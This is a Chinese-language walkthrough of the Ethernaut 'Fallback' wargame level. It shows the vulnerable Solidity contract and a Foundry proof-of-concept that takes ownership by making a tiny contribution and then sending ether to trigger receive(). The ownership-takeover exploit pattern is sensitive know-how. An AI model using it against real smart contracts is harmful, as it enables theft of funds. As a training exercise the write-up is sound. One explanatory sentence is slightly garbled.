# 目标

此级别涉及 Solidity 中的 fallback 函数（receive和fallback）。此级别的主要目标是：

- 获取合约的所有权
- 榨干合约中的所有余额

# 被攻击合约
```js
Fallback.sol:

function contribute() public payable {
    require(msg.value < 0.001 ether); //send < 0.001 ether
    contributions[msg.sender] += msg.value; // add the contribution for `msg.sender`
    if(contributions[msg.sender] > contributions[owner]) {
        owner = msg.sender; //if msg.sender has more contribution, then they become the new owner
    }
}

receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender; //if the conditions are satisfied, msg.sender becomes new owner
}


function withdraw() public onlyOwner { //only contract owner can call this function
    owner.transfer(address(this).balance); //transfer contract's balance to the owner
}
```

# 知识点

`receive`这是负责接收 Ether 的 fallback 函数。当调用不带send、transfer和 等函数的合约时会触发该函数。


# 攻击合约

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import "../instances/Ilevel01.sol";

contract POC is Test {
    Fallback level1 = Fallback(0xFEa5EC80853C53c7083F9027BE97130F3836D460);

    function test() external {
        vm.startBroadcast();

        level1.contribute{value: 1 wei}(); // call the contribute function with some ether/wei
        level1.getContribution(); // get the contribution for our user to make sure its updated
        address(level1).transfer(1 wei); // make a transfer call to trigger the receive function and become the new owner
        level1.owner(); // check who is the new owner

        vm.stopBroadcast();
    }
}
```
